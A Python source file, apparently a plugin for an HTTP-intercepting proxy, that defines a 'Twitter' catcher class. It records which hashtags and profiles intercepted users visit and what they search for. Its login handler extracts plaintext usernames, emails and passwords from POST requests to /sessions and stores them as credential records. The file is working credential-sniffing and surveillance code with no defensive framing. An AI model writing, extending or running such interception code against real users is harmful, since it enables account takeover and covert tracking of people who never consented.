
from base import *
import re

class Twitter(Catcher):
    def __init__(self):
        hosts = [r"twitter\.com"]
        paths = [ r"^/sessions", r"^/search", r"^/hashtag/", r"^/[a-zA-Z0-9_]{1,15}$"]
        super(Twitter, self).__init__(hosts, paths)

    @catcher
    def users_hashes(self, flow):
        q = flow.request
        get = GetData(q.path)

        if q.method == "GET" and q.path.startswith("hashtag"):
            m = re.search("^/hashtag/([^/]+)", get.path)
            if m:
                fact = {
                    'kind': 'click',
                    'provider': 'twitter',
                    'hashtag': '#'+m.groups()[0]
                }
                self.save(flow, fact)

        m = re.search(r"^/([a-zA-Z0-9_]{1,15})$", get.path)        
        if q.method == "GET" and m:
            if m:
                fact = {
                    'kind': 'click',
                    'provider': 'twitter',
                    'user': '@'+m.groups()[0]
                }
                self.save(flow, fact)
# jeszcze /popup?screen_name=....

    @catcher
    def login(self, flow):
        q = flow.request
        if q.path == "/sessions" and q.method == "POST":
            post = PostData(q, "session")
            
            if post.val("password") is not None:
                u_or_e = post.val("username_or_email")
                is_email = '@' in u_or_e
                fact = {
                    'kind': 'cred',
                    'id': u_or_e,
                    'provider': 'twitter',
                    'password': post.val("password"),
                    'email': is_email and u_or_e or '',
                    'username': not is_email and u_or_e or '',
                    }
                self.save(flow, fact)
                return 1

    @catcher
    def search(self, flow):
        q = flow.request
        if q.path == "/search":
            get = GetData(q.path)
            if 'q' in get.data:
                fact = {
                    'query': get.data['q'],
                    'provider': 'twitter',
                    'kind': 'query'
                }
                self.save(flow, fact)
                return 1
